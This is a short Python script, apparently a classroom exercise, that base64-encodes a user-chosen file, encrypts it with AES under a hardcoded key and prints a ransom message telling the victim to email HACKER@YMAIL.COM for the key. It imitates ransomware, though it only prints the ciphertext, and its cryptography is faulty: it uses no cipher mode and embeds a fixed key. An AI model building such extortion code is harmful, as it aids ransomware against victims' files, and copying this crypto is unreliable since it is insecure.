import base64
from Crypto.Cipher import AES

#### CONVERTE EM BASE64 ########
pergunta = input("Digite o nome do arquivo: ")
with open(pergunta, "rb") as arquivo:
    binario_arquivo = arquivo.read()
    resultado = (base64.urlsafe_b64encode(binario_arquivo))
    resultado = (resultado.decode('utf-8'))

####### VALIDA O TEXTO ###########    
def multitexto(text):
    while len(text) % 16 != 0:
        text += ' '
    return text

####### ADD NO TEXTO ##########
texto_base64 = resultado
b4 = multitexto(texto_base64)

##### CHAVE 16 24 32 BYTES #########
minha_chave = "FIAP2020FIAP2020FIAP2020FIAP2020"

###### PRINT ######
cifrado = AES.new(minha_chave)
texto_cifrado = cifrado.encrypt(b4)
print("------- SEU ARQUIVO FOI CRIPTOGRAFADO - ENTRE EM CONTATO NO EMAIL: HACKER@YMAIL.COM PARA OBTER A CHAVE -------\n")
print(texto_cifrado)
